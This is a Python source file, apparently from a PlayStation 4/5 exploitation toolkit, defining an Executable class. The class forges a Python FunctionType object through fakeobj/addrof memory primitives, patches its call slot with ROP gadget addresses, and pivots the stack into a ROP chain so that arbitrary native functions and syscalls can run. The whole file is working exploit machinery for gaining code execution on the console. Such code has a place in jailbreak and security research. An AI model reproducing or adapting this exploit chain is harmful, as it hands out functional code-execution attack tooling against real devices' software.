from types import FunctionType
from ropchain import ROPChain
from utils.ref import refbytearray
from utils.etc import addrof, sizeof
from utils.unsafe import readbuf, fakeobj
from utils.pack import p64a
from constants import CONSOLE_KIND


class Executable(object):
    def __init__(self, sc, size=0x2000 if CONSOLE_KIND == "PS4" else 0xF000):
        self.sc = sc
        self.chain = ROPChain(sc, size)

        CONTEXT_SZ = 0x210

        # allocate the objects we need, so they can be used/reused by call()
        self.call_contextbuf = bytearray(CONTEXT_SZ)
        self.call_contextbuf[0x38:0x40] = p64a(self.chain.addr)
        self.call_contextbuf[0x130:0x138] = p64a(
            self.sc.libc_addr + self.sc.gadgets["mov rsp, [rdi + 0x38]; pop rdi; ret"]
        )

        # make a copy of the built-in function type object
        self.call_functype = readbuf(addrof(FunctionType), sizeof(FunctionType))

        self.call_functype[16 * 8 : 16 * 8 + 8] = p64a(
            self.sc.exec_addr
            + self.sc.gadgets[
                "push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]"
            ]
        )

        # note: user must patch tp_call before use e.g.
        # call_functype[16*8:16*8 + 8] = p64a(0xdeadbeef)

        # get a pointer to our patched function type
        self.call_functype_ptr = refbytearray(self.call_functype)

        # note: user must set _call_contextbuf type object before each use.
        # (also need to set it here otherwise the gc will explode when it looks at my_func_ptr)
        self.call_contextbuf[8:16] = p64a(self.call_functype_ptr)

        self.my_func_ptr = refbytearray(self.call_contextbuf)
        # print("my_func_ptr", hex(my_func_ptr))
        self.call_func = fakeobj(self.my_func_ptr)

    @property
    def errno(self):
        return self.chain.errno

    def setup_front_chain(self):
        self.chain.push_value(0)

        # add bunch of padding to align the stack
        for _ in range(16):
            self.chain.push_gadget("add rsp, 0x1b8; ret")
            for _ in range(55):
                self.chain.push_value(0)

    def setup_call_chain(self, func_addr, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
        self.chain.push_call(
            func_addr, rdi=rdi, rsi=rsi, rdx=rdx, rcx=rcx, r8=r8, r9=r9
        )

        # padding to align the stack
        self.chain.push_gadget("add rsp, 0x1b8; ret")
        for _ in range(55):
            self.chain.push_value(0)

    def setup_syscall_chain(
        self, syscall_number, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0
    ):
        self.chain.push_syscall(
            syscall_number, rdi=rdi, rsi=rsi, rdx=rdx, rcx=rcx, r8=r8, r9=r9
        )

        # padding to align the stack
        self.chain.push_gadget("add rsp, 0x1b8; ret")
        for _ in range(55):
            self.chain.push_value(0)

    def setup_post_chain(self):
        self.chain.push_get_return_value()
        self.chain.push_get_errno()

    def setup_back_chain(self):
        self.chain.push_gadget("pop r8; ret")
        self.chain.push_value(addrof(None) + 0x7D)
        self.chain.push_gadget("pop rcx; ret")
        self.chain.push_value(1)
        self.chain.push_gadget("add [r8 - 0x7d], rcx; ret")
        self.chain.push_gadget("pop rax; ret")
        self.chain.push_value(addrof(None))
        self.chain.push_gadget("mov rsp, rbp; pop rbp; ret")

    def execute(self):
        self.call_func(*tuple(), **dict())
        return self.chain.return_value

    def __call__(self, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
        pass
